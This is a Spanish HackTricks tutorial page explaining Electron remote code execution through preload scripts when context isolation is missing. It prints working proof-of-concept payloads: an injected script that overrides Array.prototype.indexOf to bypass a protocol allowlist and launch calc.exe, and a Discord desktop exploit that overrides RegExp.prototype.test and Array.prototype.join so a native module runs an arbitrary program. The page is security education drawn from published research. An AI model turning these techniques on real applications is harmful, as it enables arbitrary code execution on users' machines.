# Electron contextIsolation RCE a travÃ©s del cÃ³digo de precarga

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Ejemplo 1

Ejemplo de [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

Este cÃ³digo abre enlaces http(s) con el navegador predeterminado:

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

Algo como `file:///C:/Windows/systemd32/calc.exe` se podrÃ­a usar para ejecutar una calculadora, pero `SAFE_PROTOCOLS.indexOf` lo estÃ¡ evitando.

Por lo tanto, un atacante podrÃ­a inyectar este cÃ³digo JS a travÃ©s de XSS o navegaciÃ³n arbitraria de la pÃ¡gina:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
Como la llamada a `SAFE_PROTOCOLS.indexOf` siempre devolverÃ¡ 1337, el atacante puede eludir la protecciÃ³n y ejecutar la calculadora. Exploit final:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Revisa las diapositivas originales para otras formas de ejecutar programas sin que se soliciten permisos.

Aparentemente, otra forma de cargar y ejecutar cÃ³digo es accediendo a algo como `file://127.0.0.1/electron/rce.jar`

## Ejemplo 2: RCE en la aplicaciÃ³n Discord

Ejemplo de [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

Al revisar los scripts de precarga, encontrÃ© que Discord expone la funciÃ³n, que permite llamar a algunos mÃ³dulos permitidos a travÃ©s de `DiscordNative.nativeModules.requireModule('NOMBRE-DEL-MODULO')`, en la pÃ¡gina web.\
AquÃ­, no pude usar mÃ³dulos que se pueden utilizar para RCE directamente, como el mÃ³dulo _child\_process_, pero **encontrÃ© un cÃ³digo donde se puede lograr RCE mediante la anulaciÃ³n de los mÃ©todos integrados de JavaScript** e interfiriendo con la ejecuciÃ³n del mÃ³dulo expuesto.

A continuaciÃ³n se muestra la prueba de concepto (PoC). Pude confirmar que la aplicaciÃ³n **calc** se **abre** cuando **llamo a la funciÃ³n `getGPUDriverVersions`** que estÃ¡ definida en el mÃ³dulo llamado "_discord\_utils_" desde devTools, mientras **anulo los mÃ©todos `RegExp.prototype.test` y `Array.prototype.join`**.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
La funciÃ³n `getGPUDriverVersions` intenta ejecutar el programa utilizando la biblioteca "_execa_", de la siguiente manera:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
Normalmente, _execa_ intenta ejecutar "_nvidia-smi.exe_", que se especifica en la variable `nvidiaSmiPath`. Sin embargo, debido a la anulaciÃ³n de `RegExp.prototype.test` y `Array.prototype.join`, **el argumento se reemplaza por "**_**calc**_**" en el procesamiento interno de \_execa**\_**.

EspecÃ­ficamente, el argumento se reemplaza cambiando las siguientes dos partes.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres que tu **empresa sea anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y al repositorio [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
